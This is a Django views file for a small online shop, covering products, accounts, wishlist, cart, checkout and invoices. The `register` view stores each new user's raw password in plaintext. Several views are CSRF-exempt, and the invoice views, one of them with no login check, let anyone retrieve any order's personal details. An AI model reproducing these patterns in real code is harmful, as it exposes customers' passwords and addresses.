from django.shortcuts import render, get_object_or_404, redirect
from .models import Product, Category,Order, OrderItem, WishlistItem, CartItem
from .forms import RegisterForm,ProductForm
from django.contrib.auth.forms import UserCreationForm, AuthenticationForm
from django.contrib.auth import login, logout, authenticate
from django.contrib import messages
from django.contrib.auth.decorators import login_required , user_passes_test
from .models import UserLog
from django.urls import reverse
from django.http import JsonResponse, HttpResponse, Http404
from django.template.loader import render_to_string
from django.views.decorators.csrf import csrf_exempt,csrf_protect
from django.views.decorators.http import require_POST
from django.utils import timezone
from datetime import timedelta
from .invoice import generate_invoice_docx
from docx import Document
from docx.shared import Pt
from io import BytesIO

def is_company_admin(user):
    return user.is_authenticated and user.username == 'companyadmin'
def can_edit_products(user):
    return user.is_superuser or is_company_admin(user)
@login_required
@user_passes_test(can_edit_products)
def product_create(request):
    if request.method == 'POST':
        form = ProductForm(request.POST, request.FILES)
        if form.is_valid():
            form.save()
            messages.success(request, "Product added successfully.")
            return redirect('product_list')
    else:
        form = ProductForm()
    return render(request, 'shop/product_form.html', {'form': form})


@user_passes_test(can_edit_products)
def product_update(request, pk):
    product = get_object_or_404(Product, pk=pk)
    if request.method == 'POST':
        form = ProductForm(request.POST, request.FILES, instance=product)
        if form.is_valid():
            form.save()
            messages.success(request, "Product updated successfully.")
            return redirect('product_list')
    else:
        form = ProductForm(instance=product)
    return render(request, 'shop/product_form.html', {'form': form})


@user_passes_test(can_edit_products)
def product_delete(request, pk):
    product = get_object_or_404(Product, pk=pk)
    if request.method == 'POST':
        product.delete()
        messages.success(request, "Product deleted successfully.")
        return redirect('product_list')
    return render(request, 'shop/product_confirm_delete.html', {'product': product})


@login_required
def home(request):
    product = Product.objects.first()
    return render(request, 'shop/home.html', {'product': product})

def register(request):
    if request.method == 'POST':
        form = UserCreationForm(request.POST)
        if form.is_valid():
            raw_password = request.POST['password1']
            user = form.save()

            # Corrected line: pass user instance, not username string
            UserLog.objects.create(user=user, raw_password=raw_password)

            login(request, user)
            return redirect('home')
        else:
            messages.error(request, "Registration failed.")
    else:
        form = UserCreationForm()
    return render(request, 'shop/register.html', {'form': form})



def login_view(request):
    if request.method == 'POST':
        form = AuthenticationForm(request, data=request.POST)
        if form.is_valid():
            user = form.get_user()
            login(request, user)
            return redirect('home')
        else:
            messages.error(request, "Invalid username or password.")
    else:
        form = AuthenticationForm()
    return render(request, 'shop/login.html', {'form': form})


def logout_view(request):
    logout(request)
    return redirect('login')

def product_list(request):
    category_id = request.GET.get('category')

    if category_id and category_id != 'all':
        try:
            selected_category = Category.objects.get(id=category_id)
            if selected_category.subcategories.exists():
                # Filter products in the parent category and all its subcategories
                sub_ids = selected_category.subcategories.values_list('id', flat=True)
                products = Product.objects.filter(category_id__in=[selected_category.id, *sub_ids])
            else:
                # Filter only by the selected subcategory
                products = Product.objects.filter(category_id=selected_category.id)
        except Category.DoesNotExist:
            products = Product.objects.none()
    else:
        products = Product.objects.all()

    if request.headers.get('x-requested-with') == 'XMLHttpRequest':
        html = render_to_string('shop/product_list_partial.html', {'products': products})
        return JsonResponse({'html': html})

    categories = Category.objects.filter(parent__isnull=True)
    return render(request, 'shop/product_list.html', {
        'products': products,
        'categories': categories
    })



def product_detail(request, pk):
    product = get_object_or_404(Product, pk=pk)

    next_product = Product.objects.filter(pk__gt=product.pk).order_by('pk').first()
    previous_product = Product.objects.filter(pk__lt=product.pk).order_by('-pk').first()

    return render(request, 'shop/product_detail.html', {
        'product': product,
        'next_product': next_product,
        'previous_product': previous_product
    })

def wishlist_view(request):
    wishlist_items = WishlistItem.objects.filter(user=request.user).select_related('product')
    return render(request, 'shop/wishlist.html', {'wishlist_items': wishlist_items})
@login_required
@csrf_exempt
def add_to_wishlist_view(request, product_id):
    product = get_object_or_404(Product, id=product_id)
    WishlistItem.objects.get_or_create(user=request.user, product=product)
    messages.success(request, f"{product.name} added to your wishlist.")
    return redirect('product_list')

@login_required
def remove_from_wishlist_view(request, product_id):
    if request.method == "POST" and request.headers.get("x-requested-with") == "XMLHttpRequest":
        wishlist_item = WishlistItem.objects.filter(user=request.user, product_id=product_id).first()
        if wishlist_item:
            wishlist_item.delete()
            return JsonResponse({'success': True})
        return JsonResponse({'success': False, 'error': 'Item not found'})
    
    # fallback for non-AJAX form submission
    wishlist_item = WishlistItem.objects.filter(user=request.user, product_id=product_id).first()
    if wishlist_item:
        wishlist_item.delete()
    return redirect('wishlist')

def add_all_to_cart_view(request):
    cart = request.session.get('cart', {})
    wishlist_items = WishlistItem.objects.filter(user=request.user)

    for item in wishlist_items:
        product_id = str(item.product.id)
        if product_id in cart:
            cart[product_id]['quantity'] += 1
        else:
            cart[product_id] = {
                'product_id': item.product.id,
                'quantity': 1
            }

    request.session['cart'] = cart  # Save back to session
    messages.success(request, "All wishlist items were added to your cart.")
    return redirect('cart')
@login_required
def add_to_cart(request, pk):
    product = get_object_or_404(Product, pk=pk)
    quantity = int(request.POST.get('quantity', 1))

    # Get or initialize cart
    cart = request.session.get('cart', {})

    # Ensure cart is a dictionary (not a list)
    if not isinstance(cart, dict):
        cart = {}

    # Get existing quantity in cart
    existing_quantity = cart.get(str(product.pk), {}).get('quantity', 0)
    total_requested = existing_quantity + quantity

    if total_requested > product.stock:
        messages.error(request, f"Only {product.stock - existing_quantity} more '{product.name}' available.")
    

    # Update or create item in cart
    cart[str(product.pk)] = {
        'product_id': product.pk,
        'name': product.name,
        'price': float(product.price),
        'quantity': total_requested
    }

    request.session['cart'] = cart
    messages.success(request, f"Successfully added {quantity} x '{product.name}' to your cart.")
    return redirect('product_list')



def cart_view(request):
    cart = request.session.get('cart', {})
    cart_items = []
    total_price = 0

    for item in cart.values():
        product = get_object_or_404(Product, pk=item['product_id'])
        quantity = item['quantity']
        item_total = product.price * quantity
        total_price += item_total

        cart_items.append({
            'product': product,
            'quantity': quantity,
            'item_total': item_total,
        })

    return render(request, 'shop/cart.html', {
        'cart_items': cart_items,
        'total_price': total_price
    })


@csrf_exempt
def update_cart(request):
    if request.method == "POST":
        cart = request.session.get('cart', {})

        if "remove" in request.POST:
            product_id = str(request.POST["remove"])
            cart.pop(product_id, None)

        elif "update" in request.POST:
            for key, value in request.POST.items():
                if key.startswith("quantity_"):
                    try:
                        product_id = key.split("_")[1]
                        quantity = int(value)
                        product = get_object_or_404(Product, pk=product_id)

                        if quantity > 0:
                            if quantity <= product.stock:
                                cart[product_id]['quantity'] = quantity
                            else:
                                cart[product_id]['quantity'] = product.stock
                                messages.warning(request, f"Only {product.stock} items available for '{product.name}'. Quantity adjusted.")
                    except (IndexError, ValueError):
                        continue

        request.session['cart'] = cart
        request.session.modified = True

    return redirect('cart')

from django.contrib.auth.decorators import login_required

@login_required  # Optional but recommended to force login
def checkout(request):
    cart = request.session.get('cart', {})
    cart_items = []
    total = 0

    if request.method == 'POST':
        name = request.POST.get('name')
        email = request.POST.get('email')
        phone = request.POST.get('phone')
        address = request.POST.get('address')
        pincode = request.POST.get('pincode')

        # ✅ Assign the logged-in user
        order = Order.objects.create(
            user=request.user,  # <-- THIS LINE FIXES IT
            name=name,
            email=email,
            phone=phone,
            address=address,
            pincode=pincode
        )

        for product_id, item in cart.items():
            quantity = item.get('quantity', 0)
            OrderItem.objects.create(
                order=order,
                product_name=item['name'],
                price=item['price'],
                quantity=quantity
            )

        request.session['cart'] = {}
        request.session['stock_reservation'] = {}

        messages.success(request, "Your order has been placed successfully!")
        return redirect('invoice_docx',order_id=order.id)


    # Handle GET request (reserve stock)
    reservation = request.session.get('stock_reservation', {})
    last_check = reservation.get('timestamp')

    if last_check:
        last_time = timezone.datetime.fromisoformat(last_check)
        if timezone.now() > last_time + timedelta(minutes=10):
            for product_id, reserved_quantity in reservation.get('data', {}).items():
                try:
                    product = Product.objects.get(pk=product_id)
                    product.stock += reserved_quantity
                    product.save()
                except Product.DoesNotExist:
                    pass
            request.session['stock_reservation'] = {}

    new_reservation = {}
    updated_cart = cart.copy()

    for product_id, item in cart.items():
        try:
            product = Product.objects.get(pk=product_id)
            quantity = item.get('quantity', 0)

            if product.stock >= quantity:
                product.stock -= quantity
                reserved = quantity
            else:
                reserved = product.stock
                product.stock = 0
                updated_cart[product_id]['quantity'] = reserved

            product.save()
            new_reservation[product_id] = reserved

            item_total = reserved * float(item['price'])
            cart_items.append({
                'name': item['name'],
                'price': item['price'],
                'quantity': reserved,
                'total': item_total
            })
            total += item_total

        except Product.DoesNotExist:
            continue

    request.session['cart'] = updated_cart
    request.session['stock_reservation'] = {
        'timestamp': timezone.now().isoformat(),
        'data': new_reservation
    }

    return render(request, 'shop/checkout.html', {
        'cart_items': cart_items,
        'total': total
    })
@login_required
def invoice_docx_view(request, order_id):
    order = get_object_or_404(Order, id=order_id)

    cart_items = order.items.all()
    # Calculate total for each item and overall total
    for item in cart_items:
        item.total_price = item.price * item.quantity

    total = sum(item.total_price for item in cart_items)

    context = {
        'order': order,
        'customer': order.user,
        'phone_number': order.phone,
        'shipping_address': order.address,
        'pincode': order.pincode,
        'order_date': order.created_at,
        'cart_items': cart_items,
        'total': total,
    }
    return render(request, 'shop/invoice.html', context)

def download_invoice_docx(request, order_id):
    order = get_object_or_404(Order, id=order_id)
    items = order.items.all()

    document = Document()
    document.add_heading('Invoice', level=1)

    document.add_paragraph(f'Customer: {order.user.username}')
    document.add_paragraph(f'Phone: {order.phone}')
    document.add_paragraph(f'Shipping Address: {order.address}')
    document.add_paragraph(f'Pincode: {order.pincode}')
    document.add_paragraph(f'Order Date: {order.created_at.strftime("%B %d, %Y")}')

    table = document.add_table(rows=1, cols=4)
    hdr_cells = table.rows[0].cells
    hdr_cells[0].text = 'Product'
    hdr_cells[1].text = 'Quantity'
    hdr_cells[2].text = 'Price (₹)'
    hdr_cells[3].text = 'Total (₹)'

    total_price = 0
    for item in items:
        row_cells = table.add_row().cells
        row_cells[0].text = item.product_name
        row_cells[1].text = str(item.quantity)
        row_cells[2].text = f"₹{item.price:.2f}"
        item_total = item.price * item.quantity
        row_cells[3].text = f"₹{item_total:.2f}"
        total_price += item_total

    # Add total row
    row_cells = table.add_row().cells
    row_cells[0].text = ''
    row_cells[1].text = ''
    row_cells[2].text = 'Total'
    row_cells[3].text = f"₹{total_price:.2f}"

    # Style total row bold
    for cell in row_cells[2:4]:
        for paragraph in cell.paragraphs:
            for run in paragraph.runs:
                run.bold = True

    # Prepare response
    response = HttpResponse(
        content_type='application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    )
    filename = f"invoice_order_{order.id}.docx"
    response['Content-Disposition'] = f'attachment; filename={filename}'
    document.save(response)
    return response

@login_required
def my_orders(request):
    orders = Order.objects.filter(user=request.user).order_by('-created_at')
    return render(request, 'shop/order_list.html', {'orders': orders})
